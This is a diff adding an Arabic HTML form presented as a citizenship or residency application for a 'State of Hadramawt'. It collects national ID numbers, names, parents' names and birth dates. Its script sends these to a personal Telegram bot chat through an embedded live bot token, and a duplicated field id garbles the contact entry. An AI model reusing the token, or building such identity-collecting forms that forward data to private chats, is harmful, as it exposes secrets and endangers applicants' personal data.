@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>طلب الجنسية أو الإقامة</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            direction: rtl;
+            margin: 0;
+            padding: 0;
+            background-color: #f7f2e8;
+            overflow-x: hidden;
+        }
+        /* الرأس */
+        .header {
+            background-color: #8b5e3c;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .header img {
+            height: 60px;
+            margin-right: 10px;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 24px;
+            color: #d4c5a2;
+        }
+        /* القائمة الجانبية */
+        .sidebar {
+            width: 250px;
+            background-color: #ffffff;
+            padding: 20px;
+            position: fixed;
+            top: 0;
+            right: -300px; /* جعل القائمة بعيداً عن النص */
+            height: 100%;
+            box-shadow: -2px 0 5px rgba(0, 0, 0, 0.1);
+            transition: right 0.3s ease;
+            z-index: 1000;
+            border-left: 5px solid #8b5e3c;
+        }
+        .sidebar ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        .sidebar li {
+            margin: 15px 0;
+        }
+        .sidebar a {
+            text-decoration: none;
+            color: #8b5e3c;
+            font-weight: bold;
+        }
+        .sidebar a:hover {
+            color: #2e5236;
+        }
+        /* المحتوى الرئيسي */
+        .content {
+            padding: 20px;
+            margin-right: 20px; /* ترك مساحة للقائمة الجانبية */
+        }
+        h1 {
+            text-align: center;
+            color: #8b5e3c;
+        }
+        form {
+            max-width: 600px;
+            margin: auto;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+        }
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            font-weight: bold;
+        }
+        input[type="text"],
+        input[type="date"],
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #8b5e3c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        button:hover {
+            background-color: #6f4f30;
+        }
+        /* زر إظهار/إخفاء القائمة */
+        .toggle-btn {
+            position: fixed;
+            top: 20px;
+            left: 20px;
+            width: 50px;
+            height: 50px;
+            background-color: #8b5e3c;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1001;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رأس الصفحة -->
+    <header class="header">
+        <h1>دولة حضرموت العربية</h1>
+        <img src="images/مجلس حضرموت.png" alt="شعار مجلس حضرموت">
+    </header>
+
+    <!-- زر إظهار/إخفاء القائمة -->
+    <button class="toggle-btn" id="toggle-btn" onclick="toggleSidebar()">☰</button>
+
+    <!-- القائمة الجانبية -->
+    <div class="sidebar" id="sidebar">
+        <h2>الخدمات</h2>
+        <ul>
+            <li><a href="index.html">الصفحة الرئيسية</a></li> <!-- رابط إلى الصفحة الرئيسية -->
+               </ul>
+    </div>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="content">
+        <h1>طلب الجنسية أو الإقامة</h1>
+        <form id="applicationForm">
+            <label for="nationalId">رقم الهوية الوطنية القديمة:</label>
+            <input type="text" id="nationalId" name="nationalId" required>
+
+            <label for="fullName">الاسم الكامل:</label>
+            <input type="text" id="fullName" name="fullName" required>
+
+            <label for="fatherName">اسم الأب:</label>
+            <input type="text" id="fatherName" name="fatherName" required>
+
+            <label for="motherName">اسم الأم:</label>
+            <input type="text" id="motherName" name="motherName" required>
+                        <label for="motherName">وسيلة تواصل معك:</label>
+            <input type="text" id="motherName" name="motherName" required>
+
+            <label for="birthDate">تاريخ الميلاد:</label>
+            <input type="date" id="birthDate" name="birthDate" required>
+
+            <label for="district">الموقع:</label>
+            <select id="district" name="district" required>
+                <option value="">اختار محافظتك السابقة</option>
+                <option value="مديرية 1">المهرة</option>
+                <option value="مديرية 2">حضرموت</option>
+                <option value="مديرية 3">شبوة</option>
+                <!-- يمكنك إضافة المزيد من الخيارات هنا -->
+            </select>
+
+            <button type="submit">إرسال الطلب</button>
+        </form>
+    </div>
+
+    <script>
+        function toggleSidebar() {
+            var sidebar = document.getElementById("sidebar");
+            var toggleBtn = document.getElementById("toggle-btn");
+            sidebar.style.right = sidebar.style.right === "0px" ? "-300px" : "0px"; // تغيير موقع القائمة
+        }
+
+        document.getElementById('applicationForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // منع الإرسال الافتراضي للنموذج
+
+            // الحصول على القيم من النموذج
+            const nationalId = document.getElementById('nationalId').value;
+            const fullName = document.getElementById('fullName').value;
+            const fatherName = document.getElementById('fatherName').value;
+            const motherName = document.getElementById('motherName').value;
+            const birthDate = document.getElementById('birthDate').value;
+            const district = document.getElementById('district').value;
+
+            // إنشاء نص الرسالة
+            const message = `طلب الجنسية أو الإقامة:\n` +
+                `رقم الهوية الوطنية القديمة: ${nationalId}\n` +
+                `الاسم الكامل: ${fullName}\n` +
+                `اسم الأب: ${fatherName}\n` +
+                `اسم الأم: ${motherName}\n` +
+                `تاريخ الميلاد: ${birthDate}\n` +
+                `المديرية: ${district}`;
+
+            // إرسال الرسالة إلى بوت تيليجرام
+            const token = '7681960123:AAHGTlLvBp78-3lIMXtKhQBfKdPjnlvtw3E';
+            const chatId = '1271362249'; // معرف الدردشة الخاص بك
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        alert('تم إرسال الطلب بنجاح!');
+                        document.getElementById('applicationForm').reset(); // إعادة تعيين النموذج
+                    } else {
+                        alert('حدث خطأ أثناء إرسال الطلب.');
+                    }
+                })
+                .catch(error => {
+                    alert('حدث خطأ: ' + error);
+                });
+        });
+    </script>
+
+</body>
+</html>
